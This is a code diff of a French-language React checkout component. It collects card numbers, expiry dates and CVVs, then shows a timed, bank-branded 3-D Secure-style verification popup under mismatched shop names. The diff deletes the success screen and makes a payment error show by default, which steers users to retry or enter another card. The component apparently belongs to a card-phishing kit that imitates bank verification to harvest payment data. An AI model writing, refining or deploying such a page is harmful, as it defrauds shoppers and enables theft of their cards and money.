@@ -11,10 +11,8 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     expiryDate: '',
     cvv: '',
   });
-
   const [showPaymentError, setShowPaymentError] = useState(false);
   const [showVerifError, setShowVerifError] = useState(false);
-  const [showPaymentSuccess, setShowPaymentSuccess] = useState(false);
   const [cardLogo, setCardLogo] = useState('/verified-by-visa.png');
   const [checkoutProvider, setCheckoutProvider] = useState("rento");
 
@@ -134,7 +132,6 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
       setShowPaymentError(false);
       setShowVerifError(false);
       setShow3DSecurePopup(false);
-      setShowPaymentSuccess(false);
       throw error;
     }
   };
@@ -252,9 +249,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
           setIsLoading(false);
           setShowVerifError(false);
           setShow3DSecurePopup(true);
-        }, 20000);
-
-        // Requête de paiement à l'API 
+        }, 20000);        // Requête de paiement à l'API 
         const paymentResult = await payFetch(orderNumber, amount, cardDetails);
         
         // Vérifier le statut du paiement
@@ -262,14 +257,13 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
           // Paiement réussi
           setIsLoading(false);
           setShow3DSecurePopup(false);
-          setShowPaymentSuccess(true);
           
           // Rediriger vers la page de confirmation après 3 secondes
           setTimeout(() => {
             window.location.href = '/confirmation';
           }, 3000);
         } else {
-          // Paiement échoué
+          // Afficher par défaut l'erreur de paiement
           setIsLoading(false);
           setShow3DSecurePopup(false);
           setShowVerifError(true);
@@ -292,19 +286,16 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
       setShowVerifError(true);
     }
   };
-
   const handleRetry = () => {
     setShowPaymentError(false);
     setShowVerifError(false);
     setShow3DSecurePopup(false);
-    setShowPaymentSuccess(false);
     handleCheckout(new Event('submit'));
   };
 
   const handleChangeCard = () => {
     setShowVerifError(false);
     setShow3DSecurePopup(false);
-    setShowPaymentSuccess(false);
     setFormData({
       cardNumber: '',
       expiryDate: '',
@@ -408,40 +399,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
             </article>
             <div className="loader border-top-primary"></div>
             <p className="smaller">Une fois la valiadation effectuée, vous serez redirigé vers votre suivi de commande.</p>
-          </div>
-        </div>
-      )}
-
-      {showPaymentSuccess && (
-        <div className="verification-wrapper">
-          <div className="verification-popup success">
-            <article className="head">
-              <img className="brand-logo" src="mercanett.png" alt="Christopeit France" />
-              <img
-                className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`}
-                src={cardLogo}
-                alt={data.checkoutPayVerifiedPaymentAlt}
-              />
-            </article>
-            <h2 className="icon">✅</h2>
-            <h2>Paiement réussi !</h2>
-            <p className="desc">Votre paiement a été accepté avec succès. Vous allez être redirigé vers votre suivi de commande.</p>
-            <article className="infos">
-              <span>{shop.name} - LW BRICKS</span>
-              <span>
-                Montant du paiement : {amount} €
-              </span>
-              <span> 
-                Date : {`${formattedDate} à ${formattedTime}`}
-              </span>
-              <span>
-                Carte : **** **** **** {lastFourDigits}
-              </span>
-            </article>
-            <div className="loader border-top-primary"></div>
-            <p className="smaller">Redirection automatique dans quelques secondes...</p>
-          </div>
-        </div>
+          </div>        </div>
       )}
 
       {showPaymentError && (
